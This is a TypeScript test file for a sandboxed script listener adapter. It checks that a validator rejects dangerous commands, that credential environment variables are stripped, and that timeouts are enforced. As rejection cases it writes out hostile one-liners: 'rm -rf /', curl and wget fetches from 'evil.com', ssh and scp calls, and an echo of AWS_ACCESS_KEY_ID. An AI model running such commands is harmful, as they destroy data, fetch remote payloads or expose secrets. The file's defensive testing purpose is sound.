/**
 * Tests for the script-based listener adapter.
 *
 * REQ-LNP-020 through REQ-LNP-028.
 *
 * Spec: specs/88-Listen-Notify-Plugin.md#3.3
 * axiom:trace work_item=listen-notify-01 spec=specs/88-Listen-Notify-Plugin.md plan=phase-6/task-6.5
 */
import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import { existsSync, mkdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
	buildSafeEnv,
	createScriptAdapter,
	validateScript,
} from "../src/layers/listeners/adapters/script";
import type { EventEnvelope } from "../src/layers/listeners/types";

// ── Helpers ──────────────────────────────────────────────────────────────

function makeTempDir(): string {
	const dir = join(
		tmpdir(),
		`axiom-script-test-${Date.now()}-${Math.random().toString(36).slice(2)}`,
	);
	mkdirSync(dir, { recursive: true });
	return dir;
}

// ── validateScript — REQ-LNP-022 ────────────────────────────────────────

describe("validateScript — REQ-LNP-022", () => {
	it("accepts safe commands", () => {
		const result = validateScript("echo", ["hello world"]);
		expect(result.valid).toBe(true);
	});

	it("accepts python scripts", () => {
		const result = validateScript("python3", ["./poll.py"]);
		expect(result.valid).toBe(true);
	});

	it("rejects rm -rf /", () => {
		const result = validateScript("bash", ["-c", "rm -rf /"]);
		expect(result.valid).toBe(false);
		expect(result.reason).toBeDefined();
	});

	it("rejects curl to arbitrary URLs", () => {
		const result = validateScript("bash", ["-c", "curl https://evil.com/payload"]);
		expect(result.valid).toBe(false);
	});

	it("rejects wget to arbitrary URLs", () => {
		const result = validateScript("bash", ["-c", "wget https://evil.com/payload"]);
		expect(result.valid).toBe(false);
	});

	it("rejects ssh commands", () => {
		const result = validateScript("bash", ["-c", "ssh user@host"]);
		expect(result.valid).toBe(false);
	});

	it("rejects scp commands", () => {
		const result = validateScript("bash", ["-c", "scp file user@host:/path"]);
		expect(result.valid).toBe(false);
	});

	it("rejects credential env var access", () => {
		const result = validateScript("bash", ["-c", "echo $AWS_ACCESS_KEY_ID"]);
		expect(result.valid).toBe(false);
	});
});

// ── buildSafeEnv — REQ-LNP-023 ──────────────────────────────────────────

describe("buildSafeEnv — REQ-LNP-023", () => {
	it("does not include AWS_ACCESS_KEY_ID", () => {
		const env = buildSafeEnv();
		expect(env.AWS_ACCESS_KEY_ID).toBeUndefined();
	});

	it("does not include AWS_SECRET_ACCESS_KEY", () => {
		const env = buildSafeEnv();
		expect(env.AWS_SECRET_ACCESS_KEY).toBeUndefined();
	});

	it("does not include GITHUB_TOKEN", () => {
		const env = buildSafeEnv();
		expect(env.GITHUB_TOKEN).toBeUndefined();
	});

	it("does not include AXIOM_API_TOKEN", () => {
		const env = buildSafeEnv();
		expect(env.AXIOM_API_TOKEN).toBeUndefined();
	});

	it("includes AXIOM_LISTENER=true marker", () => {
		const env = buildSafeEnv();
		expect(env.AXIOM_LISTENER).toBe("true");
	});

	it("includes non-sensitive env vars like PATH", () => {
		const env = buildSafeEnv();
		// PATH should be present (it's not a credential)
		expect(env.PATH).toBeDefined();
	});
});

// ── createScriptAdapter — REQ-LNP-020 through REQ-LNP-027 ───────────────

describe("createScriptAdapter — REQ-LNP-020 through REQ-LNP-027", () => {
	let tempDir: string;

	beforeEach(() => {
		tempDir = makeTempDir();
	});

	afterEach(() => {
		if (existsSync(tempDir)) {
			rmSync(tempDir, { recursive: true, force: true });
		}
	});

	it("starts and stops cleanly", async () => {
		const adapter = createScriptAdapter({
			listenerName: "test-script",
			config: {
				command: "echo",
				args: ["hello"],
			},
			repoRoot: tempDir,
		});

		const events: EventEnvelope[] = [];
		await adapter.start(async (e) => { events.push(e); });
		await adapter.stop();

		expect(adapter.isHealthy()).toBe(false); // stopped
	});

	it("captures stdout as event payload (REQ-LNP-025)", async () => {
		const adapter = createScriptAdapter({
			listenerName: "test-script",
			config: {
				command: "echo",
				args: ['{"status":"done","count":42}'],
			},
			repoRoot: tempDir,
		});

		const events: EventEnvelope[] = [];
		await adapter.start(async (e) => { events.push(e); });
		await adapter.stop();

		expect(events.length).toBeGreaterThan(0);
		// The payload should contain the echo output
		const payload = events[0].payload as Record<string, unknown>;
		expect(payload).toBeDefined();
	});

	it("rejects script with blocked command (REQ-LNP-022)", async () => {
		const adapter = createScriptAdapter({
			listenerName: "test-script",
			config: {
				command: "bash",
				args: ["-c", "rm -rf /"],
			},
			repoRoot: tempDir,
		});

		const events: EventEnvelope[] = [];
		await adapter.start(async (e) => { events.push(e); });
		await adapter.stop();

		// No events should be emitted for rejected scripts
		expect(events).toHaveLength(0);
		expect(adapter.isHealthy()).toBe(false);
	});

	it("rejects working_directory outside repo root (REQ-LNP-023)", async () => {
		const adapter = createScriptAdapter({
			listenerName: "test-script",
			config: {
				command: "echo",
				args: ["hello"],
				working_directory: "/etc", // outside repo root
			},
			repoRoot: tempDir,
		});

		const events: EventEnvelope[] = [];
		await adapter.start(async (e) => { events.push(e); });
		await adapter.stop();

		// Should not start due to working directory constraint
		expect(events).toHaveLength(0);
	});

	it("sets source_type to 'script'", async () => {
		const adapter = createScriptAdapter({
			listenerName: "test-script",
			config: {
				command: "echo",
				args: ["test"],
			},
			repoRoot: tempDir,
		});

		const events: EventEnvelope[] = [];
		await adapter.start(async (e) => { events.push(e); });
		await adapter.stop();

		if (events.length > 0) {
			expect(events[0].source_type).toBe("script");
			expect(events[0].listener_name).toBe("test-script");
		}
	});

	it("handles timeout by killing process (REQ-LNP-027)", async () => {
		const adapter = createScriptAdapter({
			listenerName: "test-timeout",
			config: {
				command: "sleep",
				args: ["10"],
				timeout_seconds: 0.1, // 100ms timeout
			},
			repoRoot: tempDir,
		});

		const events: EventEnvelope[] = [];
		await adapter.start(async (e) => { events.push(e); });
		await adapter.stop();

		// Should have received a timeout notification event
		const timeoutEvent = events.find(
			(e) =>
				e.payload !== null &&
				typeof e.payload === "object" &&
				(e.payload as Record<string, unknown>).type === "listener.timeout",
		);
		expect(timeoutEvent).toBeDefined();
	});
});
